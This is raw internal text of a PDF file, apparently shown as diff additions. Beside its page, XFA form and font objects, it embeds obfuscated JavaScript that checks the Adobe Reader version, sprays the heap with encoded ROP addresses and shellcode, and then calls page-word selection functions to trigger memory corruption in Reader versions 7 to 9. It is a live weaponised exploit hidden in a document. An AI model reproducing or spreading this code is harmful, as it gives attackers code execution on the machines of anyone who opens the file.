ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff∏∏    ∫¬gë˛â˛
+Lm          
+endstream 
+endobj 
+4 0 obj 
+<<
+/XFA 36 0 R
+>>
+endobj 
+36 0 obj 
+<<
+/Length 434
+/Length1 434
+>>
+stream
+<?xml version="1.0" encoding="UTF-8"?>
+<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
+  <config xmlns="http://www.xfa.org/schema/xci/2.6/">
+    <present>
+      <pdf>
+        <interactive>1</interactive>
+      </pdf>
+    </present>
+  </config>
+  <template xmlns="http://www.xfa.org/schema/xfa-template/2.1/">
+    <subform name="form1" layout="tb" locale="en_US">
+      <pageSet>
+      </pageSet>
+    </subform>
+  </template>
+</xdp:xdp>
+endstream 
+endobj 
+27 0 obj 
+<<
+/Length 14998
+>>
+stream
+
+       ver = app.viewerVersion
+
+
+
+ var aaa,bbb,ccc,ddd,eee,fff,ggg,hhh;
+var vvv="MM";
+
+var uuu="0"+"c";
+function urpl(k,sc){
+var c = "u";
+var kc=k+c;
+var re = /MM/g;
+sc = sc.replace(re,kc);
+return sc;
+}
+
+
+
+
+                function z(ppp){ aaa = ppp;}
+                function zz(){ bbb = aaa( urpl("%",'MM4141MM4141MM63a5MM4a80MM0000MM4a8aMM2196MM4a80MM1f90MM4a80MM903cMM4a84MMb692MM4a80MM1064MM4a80MM0000MM0000MM0000MM1000MM0000MM0000MM0000MM0000MM0002MM0000MM0102MM0000MM0000MM0000MM63a5MM4a80MM1064MM4a80MM2db2MM4a84MM2ab1MM4a80MM0008MM0000MMa8a6MM4a80MM1f90MM4a80MM9038MM4a84MMb692MM4a80MM1064MM4a80MMffffMMffffMM0000MM0000MM0040MM0000MM0000MM0000MM0000MM0001MM0000MM0000MM63a5MM4a80MM1064MM4a80MM2db2MM4a84MM2ab1MM4a80MM0008MM0000MMa8a6MM4a80MM1f90MM4a80MM9030MM4a84MMb692MM4a80MM1064MM4a80MMffffMMffffMM0022MM0000MM0000MM0000MM0000MM0000MM0000MM0001MM63a5MM4a80MM0004MM4a8aMM2196MM4a80MM63a5MM4a80MM1064MM4a80MM2db2MM4a84MM2ab1MM4a80MM0030MM0000MMa8a6MM4a80MM1f90MM4a80MM0004MM4a8aMMa7d8MM4a80MM63a5MM4a80MM1064MM4a80MM2db2MM4a84MM2ab1MM4a80MM0020MM0000MMa8a6MM4a80MM63a5MM4a80MM1064MM4a80MMaedcMM4a80MM1f90MM4a80MM0034MM0000MMd585MM4a80MM63a5MM4a80MM1064MM4a80MM2db2MM4a84MM2ab1MM4a80MM000aMM0000MMa8a6MM4a80MM1f90MM4a80MM9170MM4a84MMb692MM4a80MMffffMMffffMMffffMMffffMMffffMMffffMM1000MM0000MMeb90MM5e19MMfe8bMMdf8bMM60b9MM0002MMb200MMfce7MM32acMM34c2MMaaebMMcafeMMf6e2MMd3ffMMe2e8MMffffMM9cffMM9e9dMMe19fMM0b36MM340bMM0563MM54f7MM72baMMb703MM327dMM48b4MM9725MM64b0MM782dMM8de4MM7071MM21cbMM2e2dMMa12fMMa92eMM5cefMM91d6MM6b53MM27a0MM9fbfMMd53dMM7c33MMd17dMM781eMM12ceMM386fMM9742MM06c8MMc555MM6815MM974aMM40a8MMfd3cMMfb43MM8772MM8340MMbe4eMMd483MMbafdMM630fMMa9a4MM636aMM8999MM5797MM4a11MM1d47MMe188MMb031MM4b96MM1bf1MMd99dMMc618MM9d81MM1342MM119dMM4198MMc20cMM9ca3MM41e0MMc944MM8ee9MM888fMMe089MM398bMMeaf0MMd8e7MMb6b1MMbcb3MMcb42MM4783MMf2ccMMf144MM95bdMMc66eMMef2aMM27ffMM92d0MM5f24MM721aMMe607MMe216MM7a3aMM192fMM2a31MMdeb7MM9d52MM8ab9MMb124MM4d99MMfc92MM3d93MM80b6MM9b32MM43d3MMaa9cMMa1e2MM75adMMa88aMM8df1MM0345MMb288MMad00MM39f1MMaa75MM0aebMM5964MM9a54MM7b18MMe110MM22dcMMb163MM17a4MMa9d2MM07b2MM6e11MM7905MM0ee7MM6100MMf213MM0cb7MM70dfMM9baaMMdd7cMMf29bMM0087MM9fe3MM060aMM340bMM3635MM3037MM3231MM3c33MM3e3dMM383fMM3a39MM243bMM2625MM2027MM2221MM2c23MM2e2dMM282fMM2a29MM542bMM5655MMebecMMe9eaMM5c53MM5e5dMM585fMM5a59MM445bMM4645MM4047MM4241MM2937MM3e20MM2d61MM2f31MM9c4bMM7675MM7077MMf32cMM0a9eMM7e7dMM907fMM84c9MM9b84MMb6eeMM95ecMM9ceaMMa2e8MMafeeMM805fMM94daMM6b94MM5fa6MMdd1eMM11d9MMd4d6MMad99MMc956MMef66MM7bd3MMa2d0MM50baMM9f02MMfe83MMb361MM0f5fMM8a94MM51fcMM49ddMMb0b7MMd8b1MM43f3MM92e8MMfd36MMea81MM5bd3MMa6a5MM5fa7MMaef4MM6428MMeb26MMab97MM2968MMd143MMd613MM2fd7MMeaa4MM892cMMb4cdMMb2dfMMb2d9MMeebbMMc6c5MMb538MM3d89MMec96MMcea7MM8d42MM9a95MMf0a1MMb378MMa0a3MM870eMM03bbMMe6a8MMf895MMfa93MM8093MMe6cfMM1fe7MMaa94MMb91cMMbbcdMMe885MM6a81MM14ebMM7c15MM7a15MM7811MM7412MM1e1dMM581fMM5f94MM5473MM4386MM0513MM08eaMMf988MMf186MM835aMMf5e5MM206dMMc7ddMMcfc8MM6fceMMc4b0MM4bc2MMd33dMMb300MM687eMM264dMM2023MM4821MMd363MM0278MM6da6MMa115MM006eMM13dcMMb80fMMac1fMMa3acMM6d08MM0996MM1fd4MM1433MM03c6MM456fMM48aaMMb9c8MMdeddMMc31aMMb5a5MM5c2dMM879dMM8f88MM2f8eMM7c19MM8117MM2d80MMea7dMMf4ebMMc657MMc268MM5073MM3fd2MM9797MM9797MM9e7cMMc21cMM143fMM9655MMc21eMM1c3fMMb312MM6869MM5668MM9d77MM1a1cMM69dfMM6868MM5fbcMMdaaeMMe43fMM1cb4MM3fc2MM2998MM8213MM6db3MM6868MMd2a4MM1c33MM3fdaMM131fMMb39aMM686dMM1c68MM33c2MM7d14MM1e96MM33c2MM297cMM97fdMMd21aMMc727MMda1cMMc623MM021aMM6db3MM6868MM1cc5MM5fd2MM68c7MM7fc2MMda1cMMc65fMMc268MM1a7bMM772aMM6869MMa468MM2e57MM9786MM9797MM3c65MM2a1aMM68b3MM6868MM51d8MMb590MM17d0MM97a8MM6de2MM9051MMd0b5MM9051MM1a97MM4702MM6869MMc568MM121aMM6977MM6868MMfdc7MMfd97MMfd97MMfd97MMfd97MMfd97MM1a97MMb31aMM6868MM1468MM967eMMfdc6MM6897MM63c2MM021aMM68b3MM6868MM1cc5MM3bd2MM68c7MM67c2MM2a1aMM68b3MM6868MMd0d8MMa817MMe297MM1c6dMMbb22MM6869MM1c68MMd71aMM6869MM6568MMfd33MMfd97MM1c97MMa71aMM6869MMc668MMc21cMMc557MMc268MMfd4bMMff97MM9717MM9797MM95fdMM97fdMM95fdMM97ffMM9797MM1a57MMb312MM6868MMc768MMc268MM1e77MM53d2MM1250MM69b3MM6868MM9797MM9797MM1a1cMM69d3MM6868MM7e56MMae9dMMb31aMM6869MMe468MMfdeaMM1a97MM23c2MMffc5MM9397MM9797MM121aMM6db3MM6868MM1cc7MM57daMM68c6MM73c2MMd250MM973fMM9797MM7c97MM1c9eMM3fc2MM5514MM1e96MM3fc2MMea16MM973fMM9793MMe497MM1c8aMM3fd2MM2998MM921bMM6db3MM6868MM6616MM9700MM9797MMc21cMM1f3fMM821bMM6db3MM6868MM467cMM97fdMMd21aMMc727MMda1cMMc623MM021aMM6db3MM6868MM1cc5MM53d2MM68c7MM7fc2MM1a1cMM69b3MM6868MM5614MM1e96MMb31aMM6869MM7e68MM68e5MM6868MM021cMM69b3MM6868MM7556MM1c9dMMd312MM6869MMbc68MM1255MM9857MM1413MM9797MMfd97MM1a97MM23daMM1cc6MMb302MM6869MM5668MM9d75MM121cMM69d3MM6868MM55bcMM1ac7MMb31aMM686dMMc668MMc21cMMc557MMc268MM5073MM3fd2MM9797MM9797MM9e7cMMd21cMM143fMM9657MMd21eMM1c3fMMb31aMM6869MM5668MM9d76MM021cMM69d3MM6868MM46bcMMc2aeMMe43fMM1c8aMM3fd2MM2998MM921bMM6db3MM6868MM6616MM9700MM9797MMc21cMM1f3fMM821bMM6db3MM6868MM537cMM97fdMMd21aMMc727MMda1cMMc623MM021aMM6db3MM6868MM1cc5MM53d2MM68c7MM7fc2MMda1cMMc653MMc268MM1a7bMM772aMM6869MMa468MM2e57MM9786MM9797MM3c65MM2a1aMM69c7MM6868MMd0d8MMa817MMe297MM176dMMb790MM51d0MMb590MM221aMM68b3MM6868MMd0d9MM1dd1MM1f89MM1788MM97a9MM62e2MM9051MMd0b5MM9051MM1a97MM4702MM6869MMc568MM121aMM6977MM6868MMfdc7MMfd97MMfd97MMfd97MMfd97MMfd97MM1a97MMc71aMM6869MMc668MM97fdMMc268MM1c63MM57c2MM68c5MM7bc2MMc268MM1e6fMM2bd2MM97fdMMd21cMMc72bMMc268MMc66bMM1cc1MMabe4MMe31cMMef89MM6494MM1cc1MMb7e1MM6494MM5ea4MMdec4MM3ad6MM94ccMMc454MM4ca4MM2998MMad87MMe341MM569fMM905cMM4d94MM7cd7MMac66MMe288MMcd72MM1cc9MMb3c9MM4d94MM1cf1MMdc9bMMc91cMM948bMM1c4dMM1c93MM5594MM1ac0MM472aMM6868MM1c68MM5bdaMM5014MM7593MM3c6cMM14c8MM9350MM4d1cMMcec9MMd268MM545bMM267fMM686dMM7a68MM6838MM1923MM9d84MMd43bMM3b29MM044cMM73a5MM2503MM98a1MM5384MM881aMMc0e3MM9af1MMae68MMea75MM5e14MM312bMM2cfcMMb871MM18adMM8f65MM4cf6MM94afMM9797MM9657MM0a97MM96a3MM9e97MM9797MM6f97MM97d4MM9e97MM9797MMcf97MM97bdMMcf97MM967dMMf697MMf6f6MMb9f6MMf3e7MM97f1MMf5f6MMf3f4MMe7b9MMf1f3MM9797MM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM4c00MMac01MMd200MM5501MM0a00MM6663MM3831MM3030MM3030MM3063MM3063MM3039MM3737MM6530MM3839MM6538MM3833MM3862MM3') );}
+                function zzz(){ ccc = aaa( urpl("%",vvv)+uuu+uuu );ccc+=ccc;}
+                function zzzz(){while (ccc.length + 20 + 8 < 65536) ccc+=ccc;}
+                function zzzzz(){ddd = ccc["substring"](0, (0x0c0c-0x24)/2);}
+                function zzzzzz(){ddd += bbb;}
+                function zzzzzzz(){ddd += ccc;}
+                function zzzzzzzz(){eee = ddd["substring"](0, 65536/2);}
+                function zzzzzzzzz(){while(eee.length < 0x80000) eee += eee;}
+                function zzzzzzzzzz(){fff = eee["substring"](0, 0x80000 - (0x1020-0x08) / 2);}
+                function zzzzzzzzzzz(){ggg = new Array();}
+                function zzzzzzzzzzzz(){for (hhh=0;hhh<0x1f0;hhh++) ggg[hhh]=fff+"s";}
+                
+function spray_heap9(ppp)
+     {
+           z(ppp);zz();zzz();zzzz();zzzzz();zzzzzz();zzzzzzz();zzzzzzzz();zzzzzzzzz();zzzzzzzzzz();zzzzzzzzzzz();zzzzzzzzzzzz();          
+     }
+
+                
+
+        
+function zy8()
+{
+bbb = aaa(  urpl("%",'MM4141MM4141MM4141MM4141MM4141MM4141MM17f2MM4a82MM5000MM4a84MM630fMM4a80MM7ec9MM4a81MM203cMM4a82MM57bcMM4a80MM156aMM4a82MM0000MM0000MM0000MM1000MM0000MM0000MM0000MM0000MM0002MM0000MM0102MM0000MM0000MM0000MM17f2MM4a82MM156aMM4a82MMfe83MM4a81MMe982MM4a81MM0008MM0000MM597dMM4a80MM7ec9MM4a81MM2038MM4a82MM57bcMM4a80MM156aMM4a82MMffffMMffffMM0000MM0000MM0040MM0000MM0000MM0000MM0000MM0001MM0000MM0000MM17f2MM4a82MM156aMM4a82MMfe83MM4a81MMe982MM4a81MM0008MM0000MM597dMM4a80MM7ec9MM4a81MM2030MM4a82MM57bcMM4a80MM156aMM4a82MMffffMMffffMM0022MM0000MM0000MM0000MM0000MM0000MM0000MM0001MM17f2MM4a82MM5004MM4a84MM630fMM4a80MM17f2MM4a82MM156aMM4a82MMfe83MM4a81MMe982MM4a81MM0030MM0000MM597dMM4a80MM7ec9MM4a81MM5004MM4a84MMa649MM4a81MM17f2MM4a82MM156aMM4a82MMfe83MM4a81MMe982MM4a81MM0020MM0000MM597dMM4a80MM17f2MM4a82MM156aMM4a82MM00a0MM4a82MM7ec9MM4a81MM0034MM0000MM795aMM4a80MM17f2MM4a82MM156aMM4a82MMfe83MM4a81MMe982MM4a81MM000aMM0000MM597dMM4a80MM7ec9MM4a81MM2140MM4a82MM57bcMM4a80MMffffMMffffMMffffMMffffMMffffMMffffMM1000MM0000MMeb90MM5e19MMfe8bMMdf8bMM60b9MM0002MMb200MMfce7MM32acMM34c2MMaaebMMcafeMMf6e2MMd3ffMMe2e8MMffffMM9cffMM9e9dMMe19fMM0b36MM340bMM0563MM54f7MM72baMMb703MM327dMM48b4MM9725MM64b0MM782dMM8de4MM7071MM21cbMM2e2dMMa12fMMa92eMM5cefMM91d6MM6b53MM27a0MM9fbfMMd53dMM7c33MMd17dMM781eMM12ceMM386fMM9742MM06c8MMc555MM6815MM974aMM40a8MMfd3cMMfb43MM8772MM8340MMbe4eMMd483MMbafdMM630fMMa9a4MM636aMM8999MM5797MM4a11MM1d47MMe188MMb031MM4b96MM1bf1MMd99dMMc618MM9d81MM1342MM119dMM4198MMc20cMM9ca3MM41e0MMc944MM8ee9MM888fMMe089MM398bMMeaf0MMd8e7MMb6b1MMbcb3MMcb42MM4783MMf2ccMMf144MM95bdMMc66eMMef2aMM27ffMM92d0MM5f24MM721aMMe607MMe216MM7a3aMM192fMM2a31MMdeb7MM9d52MM8ab9MMb124MM4d99MMfc92MM3d93MM80b6MM9b32MM43d3MMaa9cMMa1e2MM75adMMa88aMM8df1MM0345MMb288MMad00MM39f1MMaa75MM0aebMM5964MM9a54MM7b18MMe110MM22dcMMb163MM17a4MMa9d2MM07b2MM6e11MM7905MM0ee7MM6100MMf213MM0cb7MM70dfMM9baaMMdd7cMMf29bMM0087MM9fe3MM060aMM340bMM3635MM3037MM3231MM3c33MM3e3dMM383fMM3a39MM243bMM2625MM2027MM2221MM2c23MM2e2dMM282fMM2a29MM542bMM5655MMebecMMe9eaMM5c53MM5e5dMM585fMM5a59MM445bMM4645MM4047MM4241MM2937MM3e20MM2d61MM2f31MM9c4bMM7675MM7077MMf32cMM0a9eMM7e7dMM907fMM84c9MM9b84MMb6eeMM95ecMM9ceaMMa2e8MMafeeMM805fMM94daMM6b94MM5fa6MMdd1eMM11d9MMd4d6MMad99MMc956MMef66MM7bd3MMa2d0MM50baMM9f02MMfe83MMb361MM0f5fMM8a94MM51fcMM49ddMMb0b7MMd8b1MM43f3MM92e8MMfd36MMea81MM5bd3MMa6a5MM5fa7MMaef4MM6428MMeb26MMab97MM2968MMd143MMd613MM2fd7MMeaa4MM892cMMb4cdMMb2dfMMb2d9MMeebbMMc6c5MMb538MM3d89MMec96MMcea7MM8d42MM9a95MMf0a1MMb378MMa0a3MM870eMM03bbMMe6a8MMf895MMfa93MM8093MMe6cfMM1fe7MMaa94MMb91cMMbbcdMMe885MM6a81MM14ebMM7c15MM7a15MM7811MM7412MM1e1dMM581fMM5f94MM5473MM4386MM0513MM08eaMMf988MMf186MM835aMMf5e5MM206dMMc7ddMMcfc8MM6fceMMc4b0MM4bc2MMd33dMMb300MM687eMM264dMM2023MM4821MMd363MM0278MM6da6MMa115MM006eMM13dcMMb80fMMac1fMMa3acMM6d08MM0996MM1fd4MM1433MM03c6MM456fMM48aaMMb9c8MMdeddMMc31aMMb5a5MM5c2dMM879dMM8f88MM2f8eMM7c19MM8117MM2d80MMea7dMMf4ebMMc657MMc268MM5073MM3fd2MM9797MM9797MM9e7cMMc21cMM143fMM9655MMc21eMM1c3fMMb312MM6869MM5668MM9d77MM1a1cMM69dfMM6868MM5fbcMMdaaeMMe43fMM1cb4MM3fc2MM2998MM8213MM6db3MM6868MMd2a4MM1c33MM3fdaMM131fMMb39aMM686dMM1c68MM33c2MM7d14MM1e96MM33c2MM297cMM97fdMMd21aMMc727MMda1cMMc623MM021aMM6db3MM6868MM1cc5MM5fd2MM68c7MM7fc2MMda1cMMc65fMMc268MM1a7bMM772aMM6869MMa468MM2e57MM9786MM9797MM3c65MM2a1aMM68b3MM6868MM51d8MMb590MM17d0MM97a8MM6de2MM9051MMd0b5MM9051MM1a97MM4702MM6869MMc568MM121aMM6977MM6868MMfdc7MMfd97MMfd97MMfd97MMfd97MMfd97MM1a97MMb31aMM6868MM1468MM967eMMfdc6MM6897MM63c2MM021aMM68b3MM6868MM1cc5MM3bd2MM68c7MM67c2MM2a1aMM68b3MM6868MMd0d8MMa817MMe297MM1c6dMMbb22MM6869MM1c68MMd71aMM6869MM6568MMfd33MMfd97MM1c97MMa71aMM6869MMc668MMc21cMMc557MMc268MMfd4bMMff97MM9717MM9797MM95fdMM97fdMM95fdMM97ffMM9797MM1a57MMb312MM6868MMc768MMc268MM1e77MM53d2MM1250MM69b3MM6868MM9797MM9797MM1a1cMM69d3MM6868MM7e56MMae9dMMb31aMM6869MMe468MMfdeaMM1a97MM23c2MMffc5MM9397MM9797MM121aMM6db3MM6868MM1cc7MM57daMM68c6MM73c2MMd250MM973fMM9797MM7c97MM1c9eMM3fc2MM5514MM1e96MM3fc2MMea16MM973fMM9793MMe497MM1c8aMM3fd2MM2998MM921bMM6db3MM6868MM6616MM9700MM9797MMc21cMM1f3fMM821bMM6db3MM6868MM467cMM97fdMMd21aMMc727MMda1cMMc623MM021aMM6db3MM6868MM1cc5MM53d2MM68c7MM7fc2MM1a1cMM69b3MM6868MM5614MM1e96MMb31aMM6869MM7e68MM68e5MM6868MM021cMM69b3MM6868MM7556MM1c9dMMd312MM6869MMbc68MM1255MM9857MM1413MM9797MMfd97MM1a97MM23daMM1cc6MMb302MM6869MM5668MM9d75MM121cMM69d3MM6868MM55bcMM1ac7MMb31aMM686dMMc668MMc21cMMc557MMc268MM5073MM3fd2MM9797MM9797MM9e7cMMd21cMM143fMM9657MMd21eMM1c3fMMb31aMM6869MM5668MM9d76MM021cMM69d3MM6868MM46bcMMc2aeMMe43fMM1c8aMM3fd2MM2998MM921bMM6db3MM6868MM6616MM9700MM9797MMc21cMM1f3fMM821bMM6db3MM6868MM537cMM97fdMMd21aMMc727MMda1cMMc623MM021aMM6db3MM6868MM1cc5MM53d2MM68c7MM7fc2MMda1cMMc653MMc268MM1a7bMM772aMM6869MMa468MM2e57MM9786MM9797MM3c65MM2a1aMM69c7MM6868MMd0d8MMa817MMe297MM176dMMb790MM51d0MMb590MM221aMM68b3MM6868MMd0d9MM1dd1MM1f89MM1788MM97a9MM62e2MM9051MMd0b5MM9051MM1a97MM4702MM6869MMc568MM121aMM6977MM6868MMfdc7MMfd97MMfd97MMfd97MMfd97MMfd97MM1a97MMc71aMM6869MMc668MM97fdMMc268MM1c63MM57c2MM68c5MM7bc2MMc268MM1e6fMM2bd2MM97fdMMd21cMMc72bMMc268MMc66bMM1cc1MMabe4MMe31cMMef89MM6494MM1cc1MMb7e1MM6494MM5ea4MMdec4MM3ad6MM94ccMMc454MM4ca4MM2998MMad87MMe341MM569fMM905cMM4d94MM7cd7MMac66MMe288MMcd72MM1cc9MMb3c9MM4d94MM1cf1MMdc9bMMc91cMM948bMM1c4dMM1c93MM5594MM1ac0MM472aMM6868MM1c68MM5bdaMM5014MM7593MM3c6cMM14c8MM9350MM4d1cMMcec9MMd268MM545bMM267fMM686dMM7a68MM6838MM1923MM9d84MMd43bMM3b29MM044cMM73a5MM2503MM98a1MM5384MM881aMMc0e3MM9af1MMae68MMea75MM5e14MM312bMM2cfcMMb871MM18adMM8f65MM4cf6MM94afMM9797MM9657MM0a97MM96a3MM9e97MM9797MM6f97MM97d4MM9e97MM9797MMcf97MM97bdMMcf97MM967dMMf697MMf6f6MMb9f6MMf3e7MM97f1MMf5f6MMf3f4MMe7b9MMf1f3MM9797MM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM9b9bMM4c00MMac01MMd200MM5501MM0a00MM6663MM3831MM3030MM3030MM3063MM3063MM3039MM3737MM6530MM3839MM6538MM3833MM3862MM31' ));
+}
+function spray_heap8(ppp)
+{
+      z(ppp);zy8();zzz();zzzz();zzzzz();zzzzzz();zzzzzzz();zzzzzzzz();zzzzzzzzz();zzzzzzzzzz();zzzzzzzzzzz();zzzzzzzzzzzz();  
+}
+
+function saga1()
+{
+   var cWord = this.getPageNthWord(2, 0);
+   this.selectPageNthWord(2 , 0);
+}
+function saga2()
+{
+   var cWord = this.getPageNthWord(5, 0);
+   this.selectPageNthWord(5 , 0);
+}
+function saga3()
+{
+   var cWord = this.getPageNthWord(8, 0);
+   this.selectPageNthWord(8 , 0);
+}
+
+
+
+
+if (ver>9.8)
+{
+while(1);
+}
+else
+{   if(ver>9.7)
+        {   
+            while(1);
+        }
+    
+    else
+        {
+            if(ver>9.6)
+               { 
+                    while(1);
+               }
+            else
+                {
+                    if(ver>=9)
+                        {
+
+                            spray_heap9(unescape);
+                            saga1()
+                        }  
+                    else if(ver>=8)
+                        {
+                            spray_heap8(unescape);
+                            saga2();
+                        }
+                    else if(ver>=7)
+                        {
+                            spray_heap8(unescape);
+                            saga3();
+                        }
+
+                        
+
+                }
+                
+                    
+        }
+}
+
+
+
+
+ 
+endstream 
+endobj 
+13 0 obj 
+<<
+/Parent 3 0 R
+/Resources 
+<<
+/ColorSpace 
+<<
+/CS0 14 0 R
+>>
+/Font 
+<<
+/F1 37 0 R
+>>
+/ProcSet [/PDF]
+>>
+/MediaBox [0 0 595 842]
+/pdftk_PageNum 9
+/Type /Page
+/Contents [38 0 R]
+>>
+endobj 
+12 0 obj 
+<<
+/Parent 3 0 R
+/Resources 
+<<
+/ColorSpace 
+<<
+/CS0 14 0 R
+>>
+/Font 
+<<
+/TT0 17 0 R
+>>
+/ProcSet [/PDF]
+>>
+/MediaBox [0 0 595 842]
+/pdftk_PageNum 8
+/Type /Page
+/Contents [39 0 R]
+>>
+endobj 
+11 0 obj 
+<<
+/Parent 3 0 R
+/Resources 
+<<
+/ColorSpace 
+<<
+/CS0 14 0 R
+>>
+/Font 
+<<
+/TT0 19 0 R
+>>
+/ProcSet [/PDF]
+>>
+/MediaBox [0 0 595 842]
+/pdftk_PageNum 7
+/Type /Page
+/Contents [40 0 R]
+>>
+endobj 
+37 0 obj 
+<<
+/BaseFont /Cinema
+/Subtype /TrueType
+/FontDescriptor 41 0 R
+/Widths []
+/Name /F1
+/Encoding /MacRomanEncoding
+/Type /Font
+>>
+endobj 
+41 0 obj 
+<<
+/Flags 131140
+/FontFile2 42 0 R
+/FontName /Cinema
+/FontBBox [-177 -269 1123 866]
+/Type /FontDescriptor
+>>
+endobj 
+42 0 obj 
+<<
+/Length 7965
+/Length1 7965
+>>
+stream
+       OS/2¥_Ùc  Îp   V—ä^ó  Î»   6""""§√Ë†  ±l  X3333ˇ”9  ¸  ¸DDDDÁ¥Òƒ  &`   ãgasp   H   glyftAœ  &Ï  ä~hdmx4!  Ï   Hhead›Ñ¢– T   6hheaEo  ÎL   $hmtx	∆é≤  ¥ƒ  0kern‹R’ô  Ω†  -älocaÛÀ“=  ªÑ  maxpG:  Î,    SINGŸº»µ    ﬂpost¥Z/ª  ∏Ù  éprep;Ò    ¯  h          : tl   ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff